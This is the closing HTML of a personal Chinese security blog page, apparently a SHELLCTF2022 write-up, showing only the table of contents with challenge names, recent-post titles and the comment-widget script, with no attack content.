href="/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="DASCTF2022.07赋能赛复现"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-07</div><div class="title">DASCTF2022.07赋能赛复现</div></div></a></div><div><a href="/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/" title="2022羊城杯-Web"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-04</div><div class="title">2022羊城杯-Web</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122029920.jpg" onerror="this.onerror=null;this.src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312215.gif'" alt="avatar"/></div><div class="author-info__name">Sk1y</div><div class="author-info__description">每一个不曾起舞的日子都是对生命的辜负</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sk1y233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/atom.xml" target="_blank" title="RSS链接"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SHELLCTF2022%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">SHELLCTF2022复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Choosy"><span class="toc-number">1.1.</span> <span class="toc-text">Choosy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Colour-Cookie"><span class="toc-number">1.2.</span> <span class="toc-text">Colour Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extractor"><span class="toc-number">1.3.</span> <span class="toc-text">Extractor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ILLUSION"><span class="toc-number">1.4.</span> <span class="toc-text">ILLUSION</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Doc-Holder"><span class="toc-number">1.5.</span> <span class="toc-text">Doc Holder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RAW-Agent"><span class="toc-number">1.6.</span> <span class="toc-text">RAW Agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More-ILLUSION"><span class="toc-number">1.7.</span> <span class="toc-text">More ILLUSION</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.9.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/18/ofcms1-1-4-%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="ofcms1.1.4 内容管理系统代码审计">ofcms1.1.4 内容管理系统代码审计</a><time datetime="2022-10-18T11:43:57.000Z" title="发表于 2022-10-18 19:43:57">2022-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/18/2022bytectf/" title="2022bytectf">2022bytectf</a><time datetime="2022-10-18T00:04:01.000Z" title="发表于 2022-10-18 08:04:01">2022-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/17/idea%E5%88%9B%E5%BB%BAmaven%E9%A1%B9%E7%9B%AE%E4%B8%80%E7%9B%B4%E6%98%BE%E7%A4%BAloading-archetype-list-%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" title="idea创建maven项目一直显示loading archetype list...解决方法">idea创建maven项目一直显示loading archetype list...解决方法</a><time datetime="2022-10-17T07:11:01.000Z" title="发表于 2022-10-17 15:11:01">2022-10-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/12/java-sec-code-cmdinject-rce/" title="java-sec-code-cmdinject-rce">java-sec-code-cmdinject-rce</a><time datetime="2022-10-12T11:35:05.000Z" title="发表于 2022-10-12 19:35:05">2022-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/" title="使用idea进行反编译">使用idea进行反编译</a><time datetime="2022-10-09T01:08:34.000Z" title="发表于 2022-10-09 09:08:34">2022-10-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Sk1y</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'MECC3mIv4gyVBwvpqsAnBsX8-gzGzoHsz',
      appKey: 'KuxLFi0F1Upj5MRy1yo9oAwH',
      avatar: 'monsterid',
      serverURLs: 'https://mecc3miv.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>